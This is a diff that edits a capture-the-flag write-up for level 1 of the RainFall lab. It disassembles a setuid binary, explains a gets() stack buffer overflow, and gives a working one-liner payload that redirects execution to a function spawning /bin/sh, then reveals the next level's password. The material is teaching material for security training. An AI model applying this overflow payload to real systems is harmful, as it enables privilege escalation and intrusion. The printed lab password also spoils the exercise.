@@ -1,35 +1,32 @@
-# Level1
+# Level 1
 
 ## Hint
 
-Man **gets** :)
+"Man gets" :)
 
 ## Answer
 
-First of all we have to check what we have:
+First, let's analyze what we have:
+
 ```bash
 level1@RainFall:~$ ls -l
 total 8
 -rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
-level1@RainFall:~$ ./level1 
+level1@RainFall:~$ ./level1
 42
 ```
-We have a simple program who ask for input and do nothing, interesting
 
-Let make a objdump to see what we have
+We have a simple program that takes input and appears to do nothing significant.
+
+Next, let's use objdump to inspect the program's assembly code:
+
 ```bash
 level1@RainFall:~$ objdump -d level1
-
-level1:     file format elf32-i386
-[...]
-Disassembly of section .plt:
 [...]
 08048340 <gets@plt>:
  8048340:       ff 25 98 97 04 08       jmp    *0x8049798
  8048346:       68 00 00 00 00          push   $0x0
  804834b:       e9 e0 ff ff ff          jmp    8048330 <_init+0x38>      
-[...]
-Disassembly of section .text:
 [...]
 08048444 <run>:
  8048444:       55                      push   %ebp
@@ -71,35 +68,31 @@ Disassembly of section .text:
  804849f:       90                      nop
 [...]
 ```
-We have two functions and the **run** make a system function, lets see on gdb what it call:
 ```bash
 (gdb) x/s 0x8048584
 0x8048584:       "/bin/sh"
 ```
-The system have **/bin/sh** as argument, we have to launch it!
 
-Now when we check at the **main** function, it launch a **gets** and it stop.
-We can see in the man this informations about **gets**:
-```bash
-Bugs
-    Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.
-```
-Lets use this vulnerability :D
+In the disassembled code, we find two main functions: `run` and `main`. The `run` function calls `fwrite` and `system`, with the latter using "/bin/sh" as an argument.
 
-We have can see in the main function that the stack have a size of $0x50 (80) and that the buffer start with from 0x10 (16): we know that the buffer is 64 size tall. We also know that the gets@plt jump to the right function (gets) and that it have 12 size of instructions.
+Now, let's focus on the `main` function. It reads input using the `gets` function and then returns. The `gets` function is known to be unsafe, as it can lead to buffer overflow vulnerabilities.
 
-We know now where to put the adress (64 + 12) to change the return to the right function cause it is next the gets. This technique is call "Stack buffer overflow".
+In this case, the program's stack has a size of 80 bytes, starting at 0x10 (16). Therefore, the buffer is 64 bytes long. Since the `gets` function is followed by the `run` function, we can exploit a stack buffer overflow.
 
+To do this, we need to overwrite the return address (64 + 12) with the address of the `run` function, effectively redirecting program execution to it. This technique is known as a "Stack Buffer Overflow."
+
+Let's execute the attack:
 
 ```bash
 level1@RainFall:~$ (python -c 'print("0"*76 + "\x08\x04\x84\x44"[::-1])' && cat) | ./level1
-Good... Wait what?
+```
+
+The program now executes the `run` function, which calls `/bin/sh`, and we gain shell access. We can then read the password for the next level:
+
+```bash
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 exit
-
-Segmentation fault (core dumped)
-level1@RainFall:~$
 ```
 
-It Segfault cause that the return is removed.
+However, the program eventually crashes with a segmentation fault because the return address was tampered with.
